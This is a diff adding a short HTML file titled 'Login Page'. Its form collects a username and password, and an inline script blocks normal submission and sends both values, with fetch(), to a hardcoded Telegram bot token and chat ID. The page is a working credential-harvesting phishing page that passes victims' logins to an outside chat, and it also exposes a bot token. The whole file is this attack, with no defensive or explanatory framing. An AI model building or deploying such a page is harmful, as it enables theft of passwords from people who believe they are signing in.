@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+</head>
+<body>
+    <h2>Login</h2>
+    <form onsubmit="sendLogin(event)">
+        <label>Username:</label>
+        <input type="text" id="username" required><br>
+        <label>Password:</label>
+        <input type="password" id="password" required><br>
+        <button type="submit">Login</button>
+    </form>
+
+    <script>
+        function sendLogin(event) {
+            event.preventDefault();  // Prevent actual form submission
+            
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+            
+            let botToken = "7748662277:AAEgI0XZYMK35AWYl75JOa5PxReDQ5lhdKA";  
+            let chatId = "7072093078";
+            let message = `New Login:\nUsername: ${username}\nPassword: ${password}`;
+
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)  
+                .then(response => console.log("Login Sent"))
+                .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+</html>
